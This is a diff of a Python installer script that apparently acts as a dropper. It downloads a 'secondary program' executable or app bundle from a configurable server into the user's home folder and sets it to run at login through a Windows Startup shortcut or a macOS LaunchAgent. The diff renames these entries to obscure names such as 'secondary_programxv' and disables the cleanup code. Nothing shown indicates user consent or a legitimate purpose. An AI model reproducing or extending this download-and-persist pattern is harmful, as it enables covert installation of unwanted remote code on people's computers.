@@ -10,13 +10,15 @@ import time
 import sys
 sys.path.insert(0, '/Users/apple/Desktop/pkg_installer/exe-and-dmg-installer')
 from utils.extractzip import extract_zip
+from utils.const import SERVERURL ,secondaryprogram
 INTERVAL = 10
 # import win32com.client
-baseurl ="http://127.0.0.1:5000"
+baseurl =SERVERURL 
+
 # def add_to_startup():
 #     if platform.system() == "Windows":
 #         startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-#         shortcut_path = os.path.join(startup_folder, 'main_program.lnk')
+#         shortcut_path = os.path.join(startup_folder, 'main_programxv.lnk')
 #         if not os.path.exists(shortcut_path):
 #             create_windows_shortcut(shortcut_path)
 #     elif platform.system() == "Darwin":  # macOS
@@ -40,7 +42,7 @@ baseurl ="http://127.0.0.1:5000"
 #     <plist version="1.0">
 #       <dict>
 #         <key>Label</key>
-#         <string>com.example.startup</string>
+#         <string>main_programxv</string>
 #         <key>ProgramArguments</key>
 #         <array>
 #           <string>{sys.executable}</string>
@@ -55,23 +57,24 @@ baseurl ="http://127.0.0.1:5000"
 #     """
 #     with open(plist_path, 'w') as plist_file:
 #         plist_file.write(plist_content)
-#     os.system(f'launchctl load {plist_path}')
-FIXED_TEMP_DIR = os.path.join(os.path.expanduser("~"), "lzppvvp")
-os.makedirs(FIXED_TEMP_DIR, exist_ok=True)
+#     # os.system(f'launchctl load {plist_path}')
 
-def cleanup_temp_dir():
-    try:
-        shutil.rmtree(FIXED_TEMP_DIR)
-        print(f"Temporary directory {FIXED_TEMP_DIR} removed successfully.")
-    except Exception as e:
-        print(f"Failed to remove temporary directory {FIXED_TEMP_DIR}: {e}")
+# FIXED_TEMP_DIR = os.path.join(os.path.expanduser("~"), "lzppvvp")
+# os.makedirs(FIXED_TEMP_DIR, exist_ok=True)
+
+# def cleanup_temp_dir():
+#     try:
+#         shutil.rmtree(FIXED_TEMP_DIR)
+#         print(f"Temporary directory {FIXED_TEMP_DIR} removed successfully.")
+#     except Exception as e:
+#         print(f"Failed to remove temporary directory {FIXED_TEMP_DIR}: {e}")
 
 # Register the cleanup function to be called on program exit
 
-SECONDARY_PROGRAM_NAME =  "secondary_programxv"
+PROGRAM_NAME =  secondaryprogram[0]["name"]
 def add_to_startup_windows(program_path):
     startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-    shortcut_path = os.path.join(startup_folder, f'{SECONDARY_PROGRAM_NAME}.lnk')
+    shortcut_path = os.path.join(startup_folder, f'{PROGRAM_NAME}.lnk')
 
     # Create a Windows shortcut using pywin32
     shell = win32com.client.Dispatch('WScript.Shell')
@@ -87,7 +90,7 @@ def add_to_startup_mac(program_path):
     <plist version="1.0">
     <dict>
         <key>Label</key>
-        <string>com.example.secondaryprogram</string>
+        <string>secondary_programxv</string>
         <key>ProgramArguments</key>
         <array>
       
@@ -109,10 +112,10 @@ def add_to_startup_mac(program_path):
     print(f"LaunchAgent created at {plist_path}")
 
 def download_secondary_program():
-    download_file = f"{SECONDARY_PROGRAM_NAME}.exe" if platform.system() == "Windows" else f"{SECONDARY_PROGRAM_NAME}.zip"
+    download_file = f"{PROGRAM_NAME}.exe" if platform.system() == "Windows" else f"{PROGRAM_NAME}.zip"
     dir =os.path.expanduser("~")
     download_path = os.path.join(dir, download_file)
-    secondary_program = f"{SECONDARY_PROGRAM_NAME}.exe" if platform.system() == "Windows" else f"{SECONDARY_PROGRAM_NAME}.app"
+    secondary_program = f"{PROGRAM_NAME}.exe" if platform.system() == "Windows" else f"{PROGRAM_NAME}.app"
     url = f"{baseurl}/download/" + download_file
     path = os.path.join(dir, secondary_program)
     while not os.path.exists(path):
@@ -142,10 +145,10 @@ if __name__ == '__main__':
     secondary_program_path = download_secondary_program()
     # Configure startup
     if platform.system() == "Windows":
-        path = os.path.join(os.path.expanduser("~"), SECONDARY_PROGRAM_NAME+".exe")
+        path = os.path.join(os.path.expanduser("~"), PROGRAM_NAME+".exe")
         add_to_startup_windows(path)
     elif platform.system() == "Darwin":
-        path = os.path.join(os.path.expanduser("~"), SECONDARY_PROGRAM_NAME+".app")
+        path = os.path.join(os.path.expanduser("~"), PROGRAM_NAME+".app")
         add_to_startup_mac(path)
     else:
         print("Unsupported operating system")
